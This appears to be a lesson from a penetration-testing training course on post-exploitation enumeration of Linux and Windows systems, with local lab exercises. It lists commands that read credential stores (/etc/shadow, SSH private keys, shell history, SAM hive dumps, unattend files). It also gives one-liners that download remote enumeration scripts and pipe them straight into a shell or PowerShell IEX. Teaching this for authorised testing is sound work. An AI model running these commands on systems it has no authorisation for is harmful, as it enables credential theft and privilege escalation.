# System Enumeration

Master the critical skill of gathering information from compromised systems to identify privilege escalation vectors.

## Overview

After gaining initial access to a system, enumeration is your first priority. Thorough enumeration reveals:

- System architecture and version information
- Users, groups, and permissions
- Running processes and services
- Network configuration
- Installed software and scheduled tasks
- Potential privilege escalation vectors

**Remember:** The quality of your enumeration directly impacts your success in privilege escalation.

## Labs

### Lab 1: Linux System Enumeration
**Difficulty:** Intermediate | **Duration:** 45 min

### Lab 2: Windows System Enumeration
**Difficulty:** Intermediate | **Duration:** 45 min

---

## Linux Enumeration

### Basic System Information

```bash
# Hostname and OS information
hostname
uname -a
cat /etc/*release*
cat /etc/issue
cat /proc/version

# Architecture
arch
uname -m

# Current user and groups
id
whoami
groups

# All users on the system
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1

# Users with login shells
grep -E '/bin/(ba)?sh' /etc/passwd

# Currently logged in users
who
w
last
```

### Environment Variables

```bash
# Environment variables (may contain credentials)
env
printenv
cat /etc/profile
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.bash_history

# PATH - important for hijacking
echo $PATH
```

### User and Privilege Information

```bash
# Sudo permissions
sudo -l
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# SUID binaries (critical for privesc)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Files with capabilities
getcap -r / 2>/dev/null

# World-writable files
find / -perm -o=w -type f 2>/dev/null

# World-writable directories
find / -perm -o=w -type d 2>/dev/null
```

### Network Information

```bash
# Network interfaces and IP addresses
ifconfig
ip addr
ip a

# Routing table
route -n
ip route

# ARP cache (other hosts)
arp -a
ip neigh

# DNS configuration
cat /etc/resolv.conf

# Listening ports
netstat -tulpn
ss -tulpn

# Active connections
netstat -an
ss -an

# Firewall rules
iptables -L 2>/dev/null
cat /etc/iptables/rules.v4 2>/dev/null
```

### Running Processes and Services

```bash
# Running processes
ps aux
ps -ef
ps aux | grep root

# Process tree
pstree

# Services
systemctl list-units --type=service
service --status-all

# Cron jobs (scheduled tasks)
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /var/spool/cron/crontabs/*

# Timers (systemd)
systemctl list-timers
```

### Installed Software

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RedHat/CentOS
rpm -qa
yum list installed

# Common vulnerable software
which python python2 python3 perl ruby gcc cc
which nmap nc netcat socat curl wget

# Development tools
which gcc g++ make
```

### Interesting Files

```bash
# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Configuration files
find /etc -name "*.conf" -type f 2>/dev/null
ls -la /etc/*.conf

# Password files
cat /etc/passwd
cat /etc/shadow 2>/dev/null
cat /etc/group

# Web server configs
ls -la /var/www/
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf

# Database configs
find / -name "*.sql" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null

# Log files
ls -la /var/log/
cat /var/log/auth.log
cat /var/log/syslog
```

### File System Exploration

```bash
# Find files modified in last N minutes
find / -mmin -10 2>/dev/null

# Find files owned by user
find / -user username 2>/dev/null

# Find files with specific permissions
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Large files (may contain backups)
find / -size +100M -type f 2>/dev/null

# Hidden files
find / -name ".*" -type f 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
```

---

## Windows Enumeration

### Basic System Information

```powershell
# System information
systeminfo
hostname
whoami
whoami /all
whoami /priv

# OS version
ver
wmic os get caption,version,osarchitecture

# Environment variables
set
$env:path
```

```cmd
:: CMD equivalents
systeminfo
whoami /all
set
```

### User and Group Information

```powershell
# Current user
whoami /all
net user %username%

# All local users
net user
Get-LocalUser

# Administrators
net localgroup administrators
Get-LocalGroupMember Administrators

# Domain users (if domain joined)
net user /domain
net group /domain
net group "Domain Admins" /domain

# Password policy
net accounts
```

### Network Information

```powershell
# Network configuration
ipconfig /all
Get-NetIPAddress

# Routing table
route print
Get-NetRoute

# ARP cache
arp -a
Get-NetNeighbor

# DNS cache
ipconfig /displaydns

# Listening ports
netstat -ano
Get-NetTCPConnection -State Listen

# Active connections
netstat -an
Get-NetTCPConnection

# Firewall status
netsh advfirewall show allprofiles
Get-NetFirewallProfile
```

### Running Processes and Services

```powershell
# Running processes
tasklist
Get-Process
tasklist /v

# Services
net start
Get-Service
sc query state= all

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# Startup programs
wmic startup get caption,command
Get-CimInstance Win32_StartupCommand
```

### Installed Software

```powershell
# Installed programs
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

# Check for specific tools
where /r C:\ nc.exe 2>nul
where /r C:\ python.exe 2>nul

# Installed updates
wmic qfe list
Get-HotFix
```

### Privilege Escalation Vectors

```powershell
# AlwaysInstallElevated (MSI elevation)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Service permissions
sc query
sc qc ServiceName
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Registry keys with weak permissions
accesschk.exe -kwsu "Everyone" "HKLM\SYSTEM\CurrentControlSet\Services"

# Scheduled tasks we can modify
accesschk.exe -dqv "C:\Windows\Tasks"

# Check for stored credentials
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

### Interesting Files

```powershell
# Search for password files
findstr /si password *.txt *.ini *.config *.xml
findstr /spin "password" *.*

# SAM and SYSTEM (need SYSTEM privs)
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system

# Unattend files (may contain passwords)
dir /s *sysprep.inf *sysprep.xml *unattend.xml *unattended.xml 2>nul
type C:\Windows\Panther\Unattend\Unattended.xml
type C:\Windows\Panther\Unattend.xml

# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Get-Content (Get-PSReadlineOption).HistorySavePath

# IIS configuration
type C:\Windows\System32\inetsrv\config\applicationHost.config
type C:\inetpub\wwwroot\web.config
```

---

## Automated Enumeration Tools

### LinPEAS (Linux)

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Save output to file
./linpeas.sh -a > linpeas_output.txt
```

### WinPEAS (Windows)

```powershell
# Download and run
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# Or use compiled version
.\winPEASx64.exe

# Save output
.\winPEASx64.exe > winpeas_output.txt
```

### Linux Smart Enumeration (LSE)

```bash
# Download and run
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | bash

# Different levels of enumeration
./lse.sh -l 0  # Minimal output
./lse.sh -l 1  # Interesting info
./lse.sh -l 2  # All info
```

### Other Useful Tools

```bash
# pspy - monitor processes without root
./pspy64

# LinEnum
./LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

```powershell
# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows Exploit Suggester
systeminfo > sysinfo.txt
python windows-exploit-suggester.py --database 2023-01-01-mssb.xls --systeminfo sysinfo.txt
```

---

## Enumeration Methodology

Follow this systematic approach:

```
1. SYSTEM INFO
   ├── OS version, architecture
   ├── Hostname, domain
   └── Kernel version

2. USER INFO
   ├── Current user privileges
   ├── All users/groups
   ├── Sudo/admin permissions
   └── Recently logged users

3. NETWORK INFO
   ├── IP addresses, interfaces
   ├── Listening ports
   ├── Connections to other hosts
   └── Firewall rules

4. PROCESSES & SERVICES
   ├── Running as root/SYSTEM
   ├── Vulnerable versions
   ├── Cron/scheduled tasks
   └── Startup scripts

5. FILE SYSTEM
   ├── SUID/SGID binaries
   ├── World-writable files
   ├── Interesting configs
   ├── Credentials/keys
   └── Backup files

6. SOFTWARE & TOOLS
   ├── Installed packages
   ├── Vulnerable versions
   └── Available tools
```

---

## Practice with CyberLab

### Exercise 1: Enumerate the Buffer Overflow Container

```bash
# Connect to the container
docker exec -it lab-buffer-overflow /bin/bash

# Now enumerate:
# 1. What user are you running as?
# 2. What's the OS version?
# 3. What processes are running?
# 4. What files are in /app?
# 5. Are there any SUID binaries?
```

### Exercise 2: Enumerate via Vulnerable SSH

```bash
# Connect via SSH
ssh -p 2222 labuser@localhost
# Password: labpass123

# Enumerate the system thoroughly
# Look for privilege escalation vectors
```

---

## References

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation
- [LOLBAS](https://lolbas-project.github.io/) - Windows living off the land
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

---

**Next Section:** [02 - Shell Techniques](../02-shells/)
